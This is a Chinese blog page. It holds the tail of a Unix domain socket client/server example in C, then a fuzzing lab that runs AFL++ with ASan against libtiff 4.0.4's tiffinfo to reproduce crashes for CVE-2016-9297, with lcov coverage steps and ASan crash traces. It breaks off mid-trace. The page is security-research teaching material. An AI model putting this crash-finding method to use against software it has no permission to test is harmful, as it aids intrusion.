class="comment">// 设置服务端参数(服务端的sockaddr必须和客户端的sockaddr一样)  </span></span><br><span class="line">    srv_addr.sun_family=AF_UNIX;  </span><br><span class="line">    <span class="built_in">strncpy</span>(srv_addr.sun_path,CAN_SERVICE,<span class="keyword">sizeof</span>(srv_addr.sun_path)<span class="number">-1</span>);  </span><br><span class="line">    unlink(CAN_SERVICE);  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 绑定socket地址 </span></span><br><span class="line">    ret=bind(socket_fd,(struct sockaddr*)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr));  </span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot bind server socket&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 监听   </span></span><br><span class="line">    ret=listen(socket_fd,<span class="number">1</span>);  </span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot listen the client connect request&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 接受connect请求 </span></span><br><span class="line">    len=<span class="keyword">sizeof</span>(clt_addr);  </span><br><span class="line">    accept_fd=accept(socket_fd,(struct sockaddr*)&amp;clt_addr,&amp;len);  </span><br><span class="line">    <span class="keyword">if</span>(accept_fd&lt;<span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot accept client connect request&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 读取和写入  </span></span><br><span class="line">    <span class="built_in">memset</span>(recv_buf,<span class="number">0</span>,<span class="number">1024</span>);  </span><br><span class="line">    <span class="keyword">int</span> num=read(accept_fd,recv_buf,<span class="keyword">sizeof</span>(recv_buf));  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Message from client (%d)) :%s\n&quot;</span>,num,recv_buf);    </span><br><span class="line">         </span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    close(accept_fd);  </span><br><span class="line">    close(socket_fd);  </span><br><span class="line">    unlink(CAN_SERVICE);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>客户端</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span>  </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAN_SERVICE <span class="meta-string">&quot;B&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">int</span> ret;  </span><br><span class="line">    <span class="keyword">int</span> socket_fd;   </span><br><span class="line">    <span class="keyword">char</span> snd_buf[<span class="number">1024</span>];   </span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">srv_addr</span>;</span>  </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,PF_UNIX);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,SOCK_STREAM);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建socket </span></span><br><span class="line">    socket_fd=socket(PF_UNIX,SOCK_STREAM,<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span>(socket_fd&lt;<span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot create communication socket&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置客户端参数(客户端的sockaddr必须和服务端的sockaddr一样) </span></span><br><span class="line">    srv_addr.sun_family=AF_UNIX;  </span><br><span class="line">    <span class="built_in">strcpy</span>(srv_addr.sun_path,CAN_SERVICE);  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 连接到服务端</span></span><br><span class="line">    ret=connect(socket_fd,(struct sockaddr*)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr)); </span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot connect to the server&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">memset</span>(snd_buf,<span class="number">0</span>,<span class="number">1024</span>);  </span><br><span class="line">    <span class="built_in">strcpy</span>(snd_buf,<span class="string">&quot;message from client&quot;</span>);  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取和写入    </span></span><br><span class="line">    write(socket_fd,snd_buf,<span class="keyword">sizeof</span>(snd_buf));  </span><br><span class="line">    close(socket_fd);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当 bind 执行以后，当前目录会出现一个名为 “B”(CAN_SERVICE) 的文件</li>
<li>当 unlink(CAN_SERVICE) 执行以后，文件 “B” 消失</li>
<li>如果不及时调用 unlink 的话，会出现 <code>Address already in use</code> 报错</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/100151937">超详细的Socket通信原理和实例讲解 - 知乎</a> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/Fuzz%20Lab4-tiff-4.0.4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/17/Fuzz%20Lab4-tiff-4.0.4/" class="post-title-link" itemprop="url">Fuzz Lab4-tiff-4.0.4</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-17 16:32:29" itemprop="dateCreated datePublished" datetime="2022-08-17T16:32:29+08:00">2022-08-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-10 00:09:26" itemprop="dateModified" datetime="2022-10-10T00:09:26+08:00">2022-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Fuzz-Lab4：LibTIFF"><a href="#Fuzz-Lab4：LibTIFF" class="headerlink" title="Fuzz-Lab4：LibTIFF"></a>Fuzz-Lab4：LibTIFF</h2><p>这次我们将模糊 <strong>LibTIFF</strong> 图像库（读取和写入 tiff 文件最主要的一个开源库），目标是在 libtiff 4.0.4 中为 [<strong>CVE-2016-9297</strong>] 找到 crash/PoC，并 <strong>测量 crash/PoC 的代码覆盖率数据</strong></p>
<ul>
<li><strong>CVE-2016-9297</strong> 是一个越界读取漏洞，可以通过特制的 TIFF_SETGET_C16_ASCII 或 TIFF_SETGET_C32_ASCII 标记值触发<ul>
<li>越界读取是当程序读取超出预期缓冲区末尾或开头之前的数据时发生的漏洞</li>
<li>结果，它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息</li>
</ul>
</li>
</ul>
<p>完成本练习后，您将了解：</p>
<ul>
<li>如何使用 LCOV 测量代码覆盖率</li>
<li>如何使用代码覆盖率数据来提高模糊测试的有效性</li>
</ul>
<h2 id="Do-it-yourself"><a href="#Do-it-yourself" class="headerlink" title="Do it yourself!"></a>Do it yourself!</h2><p>为了完成这个练习，你需要：</p>
<ul>
<li>Fuzz LibTiff（启用 ASan）直到出现一些独特的崩溃</li>
<li>对崩溃进行分类以找到漏洞的 PoC</li>
<li>测量这个 PoC 的代码覆盖率</li>
<li>修复问题</li>
</ul>
<h2 id="Download-and-build-your-target"><a href="#Download-and-build-your-target" class="headerlink" title="Download and build your target"></a>Download and build your target</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_tiff &amp;&amp; cd fuzzing_tiff/</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">wget https://download.osgeo.org/libtiff/tiff-4.0.4.tar.gz # 下载libtiff-4.0.4</span><br><span class="line">tar -xzvf tiff-4.0.4.tar.gz</span><br><span class="line"></span><br><span class="line">cd tiff-4.0.4/ # 构建和安装libtiff</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_tiff/install2/&quot; --disable-shared</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>作为目标二进制文件，我们可以对位于 <code>/bin</code> 文件夹中的 <code>tiffinfo</code> 二进制文件进行模糊测试，作为种子输入语料库，我们将使用 <code>/test/images/</code> 文件夹中的示例图像</p>
<p>要测试一切是否正常，只需键入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tiff/install2/bin/tiffinfo -D -j -c -r -s -w <span class="variable">$HOME</span>/tiff-4.0.4/<span class="built_in">test</span>/images/palette-1c-1b.tiff</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在最后一个命令行中，您可以看到我启用了所有这些标志：“-j -c -r -s -w”，这是为了提高 <strong>代码覆盖率</strong> 并增加发现错误的机会</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TIFF Directory at offset <span class="number">0xbd4</span> (<span class="number">3028</span>)</span><br><span class="line">  Image Width: <span class="number">157</span> Image Length: <span class="number">151</span></span><br><span class="line">  Bits/Sample: <span class="number">1</span></span><br><span class="line">  Sample Format: <span class="keyword">unsigned</span> integer</span><br><span class="line">  Compression Scheme: None</span><br><span class="line">  Photometric Interpretation: <span class="function">palette <span class="title">color</span> <span class="params">(RGB from colormap)</span></span></span><br><span class="line"><span class="function">  Samples/Pixel: 1</span></span><br><span class="line"><span class="function">  Rows/Strip: 409</span></span><br><span class="line"><span class="function">  Planar Configuration: single image plane</span></span><br><span class="line"><span class="function">  Page Number: 0-1</span></span><br><span class="line"><span class="function">  Color Map: </span></span><br><span class="line"><span class="function">       0:     0     0     0</span></span><br><span class="line"><span class="function">       1: 65535 65535 65535</span></span><br><span class="line"><span class="function">  DocumentName: palette-1c-1b.tiff</span></span><br><span class="line"><span class="function">  Software: GraphicsMagick 1.2 unreleased Q16 http:<span class="comment">//www.GraphicsMagick.org/</span></span></span><br><span class="line"><span class="function">  1 Strips:</span></span><br><span class="line"><span class="function">      0: [       8,     3020]</span></span><br></pre></td></tr></table></figure>
<ul>
<li>标签图像文件格式（Tag Image File Format，TIFF）是一种灵活的位图格式，主要用来存储包括照片和艺术图在内的图像</li>
<li>而 LibTIFF 就是打开 TIFF 文件的一种工具</li>
</ul>
<h2 id="Code-coverage"><a href="#Code-coverage" class="headerlink" title="Code coverage"></a>Code coverage</h2><p>代码覆盖率是一种软件指标，显示每行代码被触发的次数，通过使用代码覆盖率，我们将了解模糊器已到达代码的哪些部分并 <strong>可视化</strong> 模糊测试过程</p>
<p>首先，我们需要安装 lcov ，我们可以使用以下命令来完成：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lcov</span><br></pre></td></tr></table></figure>
<ul>
<li>lcov 是 gcc 测试覆盖率的前端图形展示工具</li>
</ul>
<p>现在我们需要使用 —coverage 标志（编译器和链接器）重建 libTIFF：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/tiff-4.0.4/</span><br><span class="line">make clean</span><br><span class="line">  </span><br><span class="line">CFLAGS=&quot;--coverage&quot; LDFLAGS=&quot;--coverage&quot; ./configure --prefix=&quot;$HOME/fuzzing_tiff/install/&quot; --disable-shared</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>然后我们依次输入以下内容来收集代码覆盖率数据：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/tiff-4.0.4/</span><br><span class="line">lcov --zerocounters --directory ./ # 重置以前的计数器</span><br><span class="line">lcov --capture --initial --directory ./ --output-file app.info # 返回“基线”覆盖率数据文件,其中包含每条检测线的零覆盖率</span><br><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w <span class="variable">$HOME</span>/tiff-4.0.4/<span class="built_in">test</span>/images/palette-1c-1b.tiff <span class="comment"># 运行您要分析的应用程序,您可以使用不同的输入多次运行它</span></span></span><br><span class="line">lcov --no-checksum --directory ./ --capture --output-file app2.info # 将当前覆盖状态保存到app2.info文件中</span><br></pre></td></tr></table></figure>
<p>最后，我们必须生成 HTML 输出：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info</span><br></pre></td></tr></table></figure>
<ul>
<li>如果一切顺利，代码覆盖率报告将在 html-coverage 文件夹中创建，只需打开 <code>./html-coverage/index.html</code> 文件，您应该会看到如下内容：</li>
</ul>
<img src="/2022/08/17/Fuzz%20Lab4-tiff-4.0.4/1660625470639.png" class width="1660625470639"> 
<ul>
<li>其实我并不知道这个东西有什么用</li>
</ul>
<h2 id="Fuzz-LibTIFF"><a href="#Fuzz-LibTIFF" class="headerlink" title="Fuzz LibTIFF"></a>Fuzz LibTIFF</h2><p>现在我们将在启用 ASAN 的情况下编译 libtiff</p>
<p>首先，我们要清理所有以前编译的目标文件和可执行文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_tiff/install</span><br><span class="line">cd $HOME/tiff-4.0.4/</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure>
<p>现在，我们在调用 make 之前设置 AFL_USE_ASAN=1：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --prefix=&quot;$HOME/fuzzing_tiff/install/&quot; --disable-shared</span><br><span class="line">AFL_USE_ASAN=1 make -j4</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>
<p>现在，您可以使用以下命令运行模糊器：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i $HOME/tiff-4.0.4/test/images/ -o $HOME/fuzzing_tiff/out/ -s 123 -- $HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w @@</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<img src="/2022/08/17/Fuzz%20Lab4-tiff-4.0.4/1660626617061.png" class width="1660626617061"> 
<h2 id="Triage"><a href="#Triage" class="headerlink" title="Triage"></a>Triage</h2><p>接下来我们要使用 ASan 对崩溃进行分类</p>
<p>调试使用 ASan 构建的程序比前面的练习要容易得多，我们需要做的就是向程序提供崩溃文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w ./id:000000,sig:11,src:000009,time:67581,execs:76549,op:havoc,rep:4</span> </span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">TIFFReadDirectory: Warning, Bogus <span class="string">&quot;StripByteCounts&quot;</span> field, ignoring <span class="keyword">and</span> calculating from imagelength.</span><br><span class="line">TIFF Directory at offset <span class="number">0xbd4</span> (<span class="number">3028</span>)</span><br><span class="line">  Image Width: <span class="number">157</span> Image Length: <span class="number">151</span></span><br><span class="line">  Bits/Sample: <span class="number">1537</span></span><br><span class="line">  Sample Format: <span class="keyword">unsigned</span> integer</span><br><span class="line">  Compression Scheme: None</span><br><span class="line">  Photometric Interpretation: <span class="function">palette <span class="title">color</span> <span class="params">(RGB from colormap)</span></span></span><br><span class="line"><span class="function">  Samples/Pixel: 1</span></span><br><span class="line"><span class="function">  Rows/Strip: 409</span></span><br><span class="line"><span class="function">  Planar Configuration: single image plane</span></span><br><span class="line"><span class="function">  Page Number: 0-1</span></span><br><span class="line"><span class="function">  Color Map: </span></span><br><span class="line"><span class="function">AddressSanitizer:DEADLYSIGNAL</span></span><br><span class="line"><span class="function"></span>=================================================================</span><br><span class="line">==<span class="number">3472169</span>==ERROR: AddressSanitizer: SEGV on unknown address <span class="number">0x000000000000</span> (pc <span class="number">0x00000046e5f3</span> bp <span class="number">0x7ffdb4e2bf10</span> sp <span class="number">0x7ffdb4e2bd80</span> T0)</span><br><span class="line">==<span class="number">3472169</span>==The signal is caused by a READ memory access.</span><br><span class="line">==<span class="number">3472169</span>==Hint: address points to the zero page.</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x46e5f3</span> in TIFFPrintDirectory /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_print.c</span><br><span class="line">    #<span class="number">1</span> <span class="number">0x33fbad</span> in tiffinfo /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">449</span>:<span class="number">2</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x33f1d4</span> in main /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">152</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x7f60e75b6082</span> in __libc_start_main /build/glibc-SzIz7B/glibc<span class="number">-2.31</span>/csu/../csu/libc-start.c:<span class="number">308</span>:<span class="number">16</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x29165d</span> in _start (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x29165d</span>)</span><br><span class="line"></span><br><span class="line">AddressSanitizer can <span class="keyword">not</span> provide additional info.</span><br><span class="line">SUMMARY: AddressSanitizer: SEGV /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_print.c in TIFFPrintDirectory</span><br><span class="line">==<span class="number">3472169</span>==ABORTING</span><br></pre></td></tr></table></figure>
<ul>
<li>输出的上半截就是报错信息，下半截是执行跟踪</li>
<li>程序 crash 的原因是无效的地址 <code>0x000000000000</code></li>
</ul>
<p>除了这种 crash 以外，还有其他原因：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w ./id:000002,sig:06,src:000009,time:81829,execs:92343,op:havoc,rep:8</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">TIFFReadDirectoryCheckOrder: Warning, Invalid TIFF directory; tags are <span class="keyword">not</span> sorted in ascending order.</span><br><span class="line">TIFFReadDirectory: Warning, Unknown field with tag <span class="number">7217</span> (<span class="number">0x1c31</span>) encountered.</span><br><span class="line">TIFF Directory at offset <span class="number">0xbd4</span> (<span class="number">3028</span>)</span><br><span class="line">  Image Width: <span class="number">157</span> Image Length: <span class="number">151</span></span><br><span class="line">  Bits/Sample: <span class="number">1</span></span><br><span class="line">  Sample Format: <span class="keyword">unsigned</span> integer</span><br><span class="line">  Compression Scheme: None</span><br><span class="line">  Photometric Interpretation: <span class="function">palette <span class="title">color</span> <span class="params">(RGB from colormap)</span></span></span><br><span class="line"><span class="function">  Samples/Pixel: 1</span></span><br><span class="line"><span class="function">  Rows/Strip: 409</span></span><br><span class="line"><span class="function">  Planar Configuration: single image plane</span></span><br><span class="line"><span class="function">  Page Number: 0-1</span></span><br><span class="line"><span class="function">  Color Map: </span></span><br><span class="line"><span class="function">       0: 29281 26979 24935</span></span><br><span class="line"><span class="function">       1: 28776 29517 26979</span></span><br><span class="line"><span class="function">  DocumentName: palette-1c-1b.tiff</span></span><br><span class="line"><span class="function"></span>=================================================================</span><br><span class="line">==<span class="number">3582061</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x6070000000d1</span> at pc <span class="number">0x0000002aadf2</span> bp <span class="number">0x7ffc31f49e70</span> sp <span class="number">0x7ffc31f49630</span></span><br><span class="line">READ of size <span class="number">66</span> at <span class="number">0x6070000000d1</span> thread T0</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x2aadf1</span> in <span class="built_in">fputs</span> (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x2aadf1</span>)</span><br><span class="line">    #<span class="number">1</span> <span class="number">0x47068f</span> in _TIFFPrintField /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_print.c:<span class="number">127</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x47068f</span> in TIFFPrintDirectory /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_print.c:<span class="number">641</span>:<span class="number">5</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x33fbad</span> in tiffinfo /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">449</span>:<span class="number">2</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x33f1d4</span> in main /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">152</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x7f68b28f1082</span> in __libc_start_main /build/glibc-SzIz7B/glibc<span class="number">-2.31</span>/csu/../csu/libc-start.c:<span class="number">308</span>:<span class="number">16</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x29165d</span> in _start (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x29165d</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x6070000000d1</span> is located <span class="number">0</span> bytes to the right of <span class="number">65</span>-byte region [<span class="number">0x607000000090</span>,<span class="number">0x6070000000d1</span>)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x30b6cd</span> in <span class="built_in">malloc</span> (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x30b6cd</span>)</span><br><span class="line">    #<span class="number">1</span> <span class="number">0x3564d5</span> in _TIFFmalloc /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_unix.c:<span class="number">283</span>:<span class="number">10</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x3564d5</span> in setByteArray /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_dir.c:<span class="number">51</span>:<span 